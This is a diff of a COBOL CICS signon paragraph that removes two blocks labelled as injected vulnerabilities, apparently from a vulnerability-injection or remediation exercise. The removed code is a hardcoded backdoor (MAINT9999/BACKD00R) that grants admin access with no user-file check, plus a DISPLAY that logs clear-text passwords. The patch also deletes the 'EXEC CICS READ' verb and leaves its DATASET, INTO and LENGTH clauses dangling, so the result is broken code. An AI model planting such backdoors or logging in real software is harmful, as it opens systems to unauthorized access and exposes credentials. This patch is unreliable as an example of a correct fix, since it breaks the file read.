@@ -208,31 +208,7 @@
       *----------------------------------------------------------------*
        READ-USER-SEC-FILE.
 
-      *    INJECTED-VULN-01 (CWE-798 Hardcoded Credentials /
-      *    CWE-288 Authentication Bypass): a maintenance backdoor
-      *    account bypasses the USRSEC lookup entirely and signs the
-      *    session on as an administrator regardless of what is on
-      *    file. Anyone who learns this literal can obtain full
-      *    admin access without a valid USRSEC record.
-           IF WS-USER-ID = 'MAINT9999' AND WS-USER-PWD = 'BACKD00R'
-               MOVE WS-TRANID    TO CDEMO-FROM-TRANID
-               MOVE WS-PGMNAME   TO CDEMO-FROM-PROGRAM
-               MOVE WS-USER-ID   TO CDEMO-USER-ID
-               MOVE 'A'          TO CDEMO-USER-TYPE
-               MOVE ZEROS        TO CDEMO-PGM-CONTEXT
-               EXEC CICS XCTL
-                   PROGRAM ('COADM01C')
-                   COMMAREA(CARDDEMO-COMMAREA)
-               END-EXEC
-           END-IF.
 
-      *    INJECTED-VULN-02 (CWE-532 Insertion of Sensitive
-      *    Information into Log File): logs the clear-text user ID
-      *    and password to the CICS/job log on every signon attempt.
-           DISPLAY 'SIGNON ATTEMPT UID=' WS-USER-ID
-                    ' PWD=' WS-USER-PWD.
-
-           EXEC CICS READ
                 DATASET   (WS-USRSEC-FILE)
                 INTO      (SEC-USER-DATA)
                 LENGTH    (LENGTH OF SEC-USER-DATA)
